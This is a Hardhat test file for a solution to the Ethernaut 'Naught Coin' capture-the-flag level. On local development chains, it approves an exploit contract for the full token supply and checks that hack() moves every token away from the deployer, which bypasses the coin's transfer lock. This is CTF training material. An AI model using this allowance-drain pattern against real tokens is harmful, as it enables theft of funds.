import { ethers, deployments, getNamedAccounts, network } from "hardhat"
import { assert, expect } from "chai"
import { developmentChains } from "../../helper-hardhat-config"
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { NaughtCoin, NaughtCoinExploit } from "../../typechain-types"

!developmentChains.includes(network.name)
    ? describe.skip
    : describe("Naught Coin Exploit", () => {
          let deployer: SignerWithAddress, exploiter: SignerWithAddress
          let naughtCoin: NaughtCoin
          let naughtCoinExploiter: NaughtCoinExploit

          before(async () => {
              const accounts = await ethers.getSigners()

              deployer = accounts[0]
              exploiter = accounts[1]
              await deployments.fixture(["naughtcoin"])

              naughtCoin = await ethers.getContract("NaughtCoin", deployer)
              naughtCoinExploiter = await ethers.getContract("NaughtCoinExploit", deployer)
          })

          it("Naught Exploit Testing", async () => {
              const supply = await naughtCoin.totalSupply()

              const deployerTokens = await naughtCoin.balanceOf(deployer.address)
              expect(supply.sub(deployerTokens)).equals(0, "initial supply = deployer tokens")

              const approveTx = await naughtCoin.approve(naughtCoinExploiter.address, supply)
              await approveTx.wait()

              expect(
                  await naughtCoin.allowance(deployer.address, naughtCoinExploiter.address)
              ).equals(supply, "exploiter allowance = total supply ")

              const transferTx = await naughtCoinExploiter.hack()
              await transferTx.wait(1)

              expect(await naughtCoin.balanceOf(deployer.address)).equals(
                  0,
                  "deployer balance = 0 after transfer"
              )
              expect(await naughtCoin.balanceOf(naughtCoinExploiter.address)).equals(
                  supply,
                  "supply = naughtcoin exploiter"
              )
          })
      })
